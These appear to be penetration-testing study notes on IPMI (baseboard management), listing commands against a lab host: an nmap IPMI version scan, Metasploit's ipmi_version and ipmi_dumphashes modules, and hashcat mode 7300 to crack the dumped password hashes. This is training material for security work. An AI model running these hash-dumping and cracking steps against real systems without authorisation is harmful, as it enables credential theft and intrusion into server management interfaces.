# Intelligent Platform Management 
- Set of standardized specifications for hardware-based host management systems used for system management and monitoring.
- Allows sysadmins to manage and monitor systems using direct network connection to the system's hardware.
- TYpically used in 3 ways:
	- Before the OS has booted to modify BIOS settings
	- When the host is fully powered down
	- Access to a host after a system failure

# Footprinting the Service
- nmap
```bash
sudo nmap -sU --script ipmi-version -p623 ilo.inlanefreight.local
```
- Metasploit
```bash
use auxiliary/scanner/ipmi/ipmi_version
```
- Metasploit Dumping Hashes
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
- If no password is displayed, use hashcat to crack the password:
```bash
hashcat -m 7300 hash.txt
```